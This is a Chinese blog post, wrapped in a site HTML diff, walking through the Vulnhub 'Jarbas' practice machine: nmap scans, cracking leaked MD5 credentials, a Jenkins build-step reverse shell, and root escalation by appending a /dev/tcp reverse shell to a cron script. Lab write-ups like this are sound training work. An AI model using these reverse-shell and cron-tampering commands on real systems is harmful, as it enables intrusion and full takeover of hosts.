@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Panther64Hang">
+    
+    <title>
+        
+            jarbas |
+        
+        Panther
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.png">
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#000033","logo":"/images/logo.png","favicon":"/images/logo.png","avatar":"/images/logo.png","font_size":"16px","font_family":"STHeiti","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bkground.jpg","description":null,"font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":false,"custom_label_list":["Fighter"]},"word_count":{"enable":true,"wordcount":true,"min2read":false},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Panther
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">jarbas</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/logo.png">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Panther64Hang</span>
+                            
+                                <span class="author-label">Fighter</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-11-16 15:46:00</span>
+        <span class="mobile">2023-11-16 15:46</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-11-16 15:51:49</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Vulnhub/">Vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.2k 字</span>
+        </span>
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <p>自我沉淀，跟随红队笔记的视频讲解，进行Jarbas靶场的学习以及实验笔记，Right on！</p>
+<span id="more"></span>
+
+<h1 id="Jarbas"><a href="#Jarbas" class="headerlink" title="Jarbas"></a>Jarbas</h1><h2 id="1-Nmap扫描"><a href="#1-Nmap扫描" class="headerlink" title="1.Nmap扫描"></a>1.Nmap扫描</h2><p>进行主机发现，用 <strong>-sn</strong> 参数（ping 扫描）扫描同网段的存活主机。<strong>实际渗透测试建议在靶机未上线时先扫描一次，靶机上线之后再扫描一次，这样对比观察就能确定靶机的IP</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.72.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109084813665.png"
+                      alt="image-20231109084813665"
+                ></p>
+<p>成功发现了靶机的IP为192.168.72.156。</p>
+<p>端口扫描，选择TCP扫描，以每秒10000的最小速率（–min-rate 10000）扫描全部端口(-p-)，其中10000是扫描准度和速度的权衡结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -min-rate 10000 -p- 192.168.72.156 -oA /opt/nmapscan/jarbas/ports</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109085532477.png"
+                      alt="image-20231109085532477"
+                ></p>
+<p>扫描结果显示4个端口存活：22，80，3306，8080；</p>
+<p>进一步扫描具体用TCP扫描（-sT），脚本扫描（-sC)，查看其服务版本（-sV）和操作系统（-O）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sC -sV -O -p22,80,3306,8080 192.168.72.156 -oA /opt/nmapscan/jarbas/details</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109092437060.png"
+                      alt="image-20231109092437060"
+                ></p>
+<p>根据扫描结果：</p>
+<p>22端口为SSH服务，OpenSSH 7.4版本；</p>
+<p>80端口为Apache，由CentOS和PHP搭建；</p>
+<p>3306为MySQL，可能是MariaDB；</p>
+<p>8080端口为http，服务版本是Jetty 9.4.z-SNAPSHOT（不太熟悉）；</p>
+<p>再进行一次UDP的扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -p22,80,3306,8080 192.168.72.156</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109093411006.png"
+                      alt="image-20231109093411006"
+                ></p>
+<p>扫描结果显示UDP端口全为关闭状态；</p>
+<p>试试脚本扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 22,80,3306,8080 192.168.72.156 -oA /opt/nmapscan/jarbas/vuln</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109094217977.png"
+                      alt="image-20231109094217977"
+                ></p>
+<p>漏洞扫描也没太多发现，就发现8080端口有一个 <strong>robots.txt</strong> 的文件，一会可以看一下。</p>
+<p>下面我们要开始渗透了，至于从哪里入手，分析如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一共开放了四个端口，22远程登录，3306数据库MySQL，还有两个web端口80和8080。显然这个靶机的入口应该还是web。SSH没有太多的攻击面。因此接下来，我们先进行web渗透。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-Web渗透"><a href="#2-Web渗透" class="headerlink" title="2.Web渗透"></a>2.Web渗透</h2><p>浏览器访问页面192.168.72.156，可以看到一个Jarbas的页面，这就是80端口的页面</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109092828270.png"
+                      alt="image-20231109092828270"
+                ></p>
+<p>8080也是Web端口，我们同样用浏览器访问192.168.72.156:8080 ，发现是一个登录界面：<strong>同时暴露了cms是Jenkins。</strong></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109093027935.png"
+                      alt="image-20231109093027935"
+                ></p>
+<p>如果能够登录进这个界面，应该就可以看到更多有关网站管理后台的信息。因此我们的首要思路就是如何找到这个登录界面的账号和密码，寻找用户名和密码有如下几个思路：</p>
+<ol>
+<li>尝试默认登录，Jenkins是常见cms，可能存在默认密码；</li>
+<li>尝试弱口令爆破；</li>
+<li>尝试渗透寻找相关密码。</li>
+</ol>
+<p>我们还是先找找有没有一些信息泄露的位置，可能暴露这里的登录用户名和密码。其次在网上搜索有没有Jenkins这类cms的默认登录密码，爆破是迫不得已的方法。</p>
+<p>这里插叙一下，在进行nmap漏洞扫描的时候，我们发现了8080端口又robots.txt，因此访问192.168.200.140:8080&#x2F;robots.txt试一试：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109094731852.png"
+                      alt="image-20231109094731852"
+                ></p>
+<p>robots.txt界面有一句话，我们不想让机器人点击“build”链接，此时我们并不了解含义，大致猜测应该是网站不希望一些自动化工具点击build。下面我们再进行一下目录爆破80端口，看看有没有什么其他可以提供信息的web页面。先用dirb试试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.72.156</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109100152952.png"
+                      alt="image-20231109100152952"
+                ></p>
+<p>非常遗憾，啥也没看出来，不应该呀。通常web后台我们关注的是.php和.html页面，那么我们再指定参数 –x .php,.html试一试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.72.156 –X .php,.html</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109100718851.png"
+                      alt="image-20231109100718851"
+                ></p>
+<p>结果还不错，扫出来一个access.html页面，当然还有一个index.html页面。我们尝试访问192.168.72.156&#x2F;access.html：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109100813967.png"
+                      alt="image-20231109100813967"
+                ></p>
+<p>关键信息原来在这儿呢！首先access的意思就有访问、到达的含义，这个页面还给出了一些关键信息，首先是图片上方的标题，直译结果为：凭据以安全的方式进行了加密！</p>
+<p>这里的creds凭据应该就是指密码，下面有三行信息，貌似是用户名和密码，密码经过加密，貌似是md5的形式，那么我们用hash-identifier确认一下加密方式，把第一行的数据5978a63b4654c73c60fa24f836386d87检测一下。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109101239923.png"
+                      alt="image-20231109101239923"
+                ></p>
+<p>好了，下一步就是用md5破解工具，这里找了个在线md5破解网站，把三行md5加密后的内容复制进去。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tiago--5978a63b4654c73c60fa24f836386d87--italia99</span><br><span class="line">trindade--f463f63616cb3f1e81ce46b39f882fd5--marianna</span><br><span class="line">eder--9b38e2b1e8b12f426b0d208a7ab6cb98--vipsu</span><br></pre></td></tr></table></figure>
+
+<p>成功搞到了三个密码，接下来使用这三个密码对8080端口的登录进行尝试。</p>
+<p><strong>用户名eder密码vipsu可以成功登录</strong>，登录进来的页面如下：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231109101817620.png"
+                      alt="image-20231109101817620"
+                ></p>
+<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><p>在第二步中，我们已经成功登录了8080端口的页面，进来之后发现是一个cms的后台管理页面，这个后台是Jenkins，下面我们就是需要寻找这个cms有哪些漏洞。我们可以先去kali中的searchsploit搜索一下，或者去msf看看有没有Jenkins的相关漏洞。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116144639864.png"
+                      alt="image-20231116144639864"
+                ></p>
+<p>我这里一搜发现一大堆，整的我有选择恐惧症了。红队笔记大佬说他对Jenkins这个cms非常熟悉，因此漏洞触发的点也非常清楚。</p>
+<p>进入登录进来的页面有一个创建新项目的选项，那我们干脆创建一个项目，并观察创建过程的配置选项，看看是否存在可能出现漏洞的位置。点击create new job，随便给项目起个名字，我们这里就叫Hacking吧，项目类型就选第一个freestyle project，点击ok。至于为啥选freestyle project，只能说这个排在第一个，应该是最常用的选项，最有可能具有更多的功能点，也就有可能有更多的攻击面。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116145053655.png"
+                      alt="image-20231116145053655"
+                ></p>
+<p> 点击ok之后，进入了下图的配置界面。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116145553834.png"
+                      alt="image-20231116145553834"
+                ></p>
+<p>这个配置界面的选项有很多，我们的目标是寻找漏洞。发现有个build模块，想起了之前robots.txt的提示，可能就是说不希望自动化工具在这里build。因此我们看一下Build模块，点击add build step，下拉箭头有很多，第一个是执行windows批处理命令，之前nmap扫描的时候已经发现靶机是linux，因此这个选项不在我们考虑的范围。第二个命令是excute shell执行shell，这就很有趣了，这里可以执行shell吗？那我们是不是可以在这里构造反弹shell的命令，然后build执行？</p>
+<p>我们选择excute shell，出现了command输入界面，我们就输入反弹shell的命令，点击save用kali的4444端口接收反弹shell好了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.72.150/4444 0&gt;&amp;1</span><br><span class="line"># 命令中的ip为kali的ip和kali监听的端口，即接收反弹shell的ip和端口</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116145816592.png"
+                      alt="image-20231116145816592"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116145924693.png"
+                      alt="image-20231116145924693"
+                >点击save之后，项目新建成功。</p>
+<p>在启动这个项目之前（build now按钮点击之前)，我们先要在kali上开启4444端口进行监听。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc –lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116150059067.png"
+                      alt="image-20231116150059067"
+                ></p>
+<p> 然后在刚才的Jenkins管理界面点击build now； 点击之后，管理界面如下图，项目应该是成功建立并启动了：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116150151480.png"
+                      alt="image-20231116150151480"
+                ></p>
+<p>回到刚才进行监听4444端口的kali终端，成功获得了初始立足点，获得了一个反弹shell：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116150218753.png"
+                      alt="image-20231116150218753"
+                ></p>
+<p>我们就看看这个shell的相关信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname –a</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116150856017.png"
+                      alt="image-20231116150856017"
+                ></p>
+<p> 发现这个shell的用户叫做jenkins，和cms同名，同时权限很低，我们试试能不能看到&#x2F;etc&#x2F;passwd中所有的账户信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116151116733.png"
+                      alt="image-20231116151116733"
+                ></p>
+<p> 这里有两个用户是有bash的，即root和eder。而我们正在登录的jenkins的bash还并不完全，为&#x2F;bin&#x2F;false。我们再试试能不能查看&#x2F;etc&#x2F;shadow</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116151211901.png"
+                      alt="image-20231116151211901"
+                ></p>
+<p>很遗憾，没权限。那么我们就无法通过&#x2F;etc&#x2F;passwd破解登录的账户和密码了。此时我们已经获得了初始立足点jenkins，接下来的关键就是找到提权的方法获取root权限。</p>
+<h2 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4.权限提升"></a>4.权限提升</h2><p>提权的基本思路就是：<strong>以低权限修改可执行文件&#x2F;脚本，却以高权限运行可执行文件&#x2F;脚本</strong>。因此我们的思路就是寻找以高权限运行的脚本，企图修改脚本，在其中添加我们的“<strong>恶意指令</strong>”，最终实现提权。最终发现了以root权限运行的定时任务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116151514197.png"
+                      alt="image-20231116151514197"
+                ></p>
+<p>发现了一个每五分钟定期执行的sh脚本CleaningScript.sh，我们看一看他是啥：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116151602909.png"
+                      alt="image-20231116151602909"
+                ></p>
+<p>是一个定期删除日志的脚本。那么我们试试能不能追加一行，让在定时任务中加入命令，使得反弹shell到kali,注意在追加这个命令之前，先要另起一个终端，监听4443端口用于接收root的反弹shell。监听哪个端口无所谓，但不要选择之前接收jenkins的4444端口，避免冲突混乱。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.72.150/4442 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleaningScript.sh</span><br><span class="line"># 追加反弹shell命令</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116152139012.png"
+                      alt="image-20231116152139012"
+                ></p>
+<p>最多等待5min后（因为定时任务是每5min执行一次），在监听4442端口的终端应该会接收到靶机root权限的shell，果然，成功提权：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/jarbas/image-20231116153543301.png"
+                      alt="image-20231116153543301"
+                ></p>
+<p>flag就在当前目录下（做的时候搞忘记截图了，还要再等5分钟，遂无图）。</p>
+<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>打靶完成后，再进行一下总结。这个打靶的全过程思路如下：</p>
+<ol>
+<li><p>主机发现，nmap扫描发现靶机是192.168.200.140</p>
+</li>
+<li><p>端口扫描，发现开放了22，80，3306，8080四个端口。并针对这四个端口进行漏洞扫描，发现8080端口有一个robots.txt的文件</p>
+</li>
+<li><p>目录扫描，从web界面入手，发现jarbas的界面和8080端口的登录界面。对网站进行目录扫描后发现access.html文档，经过解密，成功得到了用户名和密码，登录进入了名为Jenkins的cms后台。</p>
+</li>
+<li><p>查看端口扫描出的robots.txt文件，发现有关于build的提示，在Jenkins的解密寻找漏洞和可能build的位置，成功发现了execute shell的位置，输入反弹shell到kali的指令，点击build now，成功建立项目并执行命令，kali中之前监听的端口接收到了反弹shell，拿到了初始立足点jenkins的shell</p>
+</li>
+<li><p>提权。发现此时jenkins的shell权限很低，我们企图寻找以高权限运行的脚本，企图修改脚本，在其中添加我们的“恶意指令”，最终实现提权。最终发现了以root权限运行的定时任务。在其中追加了反弹root的shell的指令，并在kali中另起一个终端监听端口，成功拿到了root权限的shell。</p>
+</li>
+</ol>
+<p>这个靶机也不算难。但在打靶的过程还是涉及到了一些脑洞和知识点。我感觉不太容易想到的地方和启发有如下几点：</p>
+<ol>
+<li><p>网站目录扫描的时候，默认不带参数，是无法扫出access.html页面的，如果卡在这里就完全走不下去了。因此做网站目录扫描的时候，如果一次扫不出结果，可以添加一些参数，或使用多种扫描工具，尽可能多获得一些信息。</p>
+</li>
+<li><p>拿到access.html页面的三个用户名和密码并尝试登录8080端口失败后，是怎么想到用户名和密码可能不对应的？这里需要经验、脑洞。同时也启发我们，当信息有限且无法利用的时候（我们只有这三个用户名和密码，但对应登录都不对），可以尽可能的尝试利用有限的信息。</p>
+</li>
+<li><p>漏洞利用的时候，如果对Jenkins这个cms并不了解，如何进行渗透。这里考察了大家的信息检索能力，如何检索漏洞信息。当然，本文写道可以利用robots信息的提示，但我感觉这个提示还是略显牵强，如果我不了解Jenkins，不看红队笔记大佬视频，也不知道搜索出来的漏洞利用exp如何跑，还是很难进行下一步。而主观上对web界面进行探索，观察可能存在漏洞的位置也是不错的思路。</p>
+</li>
+<li><p>提权的时候，咋想到用crontab定时任务的。需要一些经验，也需要对提权有所了解才行。还是要了解提权的核心思路：以低权限修改可执行文件&#x2F;脚本，却以高权限运行可执行文件&#x2F;脚本。</p>
+</li>
+</ol>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">jarbas</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Panther64Hang</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-11-16 15:46:00</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/11/16/jarbas/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Vulnhub/">#Vulnhub</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/11/07/w1r3s/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">W1r3s靶场练习</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Jarbas"><span class="nav-number">1.</span> <span class="nav-text">Jarbas</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Nmap%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text">1.Nmap扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Web%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">2.Web渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">3.漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.4.</span> <span class="nav-text">4.权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">5.总结</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Panther64Hang</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
